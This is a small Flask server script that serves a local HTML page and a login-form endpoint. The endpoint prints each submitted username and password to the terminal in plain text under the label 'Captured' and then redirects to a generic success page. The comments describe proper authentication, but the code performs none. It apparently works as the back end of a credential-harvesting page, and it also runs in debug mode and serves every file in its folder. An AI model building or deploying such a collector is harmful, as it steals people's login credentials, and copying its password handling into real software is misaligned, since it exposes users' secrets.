from flask import Flask, request, redirect, url_for, send_from_directory
import os

# Initialize the Flask application
app = Flask(__name__)

# Serve the index.html page
@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

# Serve static files (css, images)
@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

# Define a route and specify that it accepts POST requests
@app.route('/submit-form', methods=['POST'])
def handle_submission():
    # 1. Extract the data sent from the HTML form
    # The keys match the 'name' attributes in the HTML <input> tags
    user_id = request.form.get('user_id')
    password = request.form.get('password')
    
    # 2. Server-Side Logic
    # Legitimate applications process the data here.
    # For authentication, this involves querying a database and 
    # securely comparing hashes (never storing plain text).
    
    # Example validation logic
    if user_id and password:
        # Print to terminal
        print(f"Captured - Username: {user_id}, Password: {password}")
        
        # 3. Respond to the Client
        # Instead of staying on the POST route, it is standard practice
        # to redirect the user after a successful submission.
        return redirect(url_for('success_page'))
    else:
        return "Submission failed: Missing username or password", 400

# A simple route to redirect to upon success
@app.route('/success')
def success_page():
    return "Data processed successfully."

if __name__ == '__main__':
    # Run the development server
    app.run(port=5000, debug=True)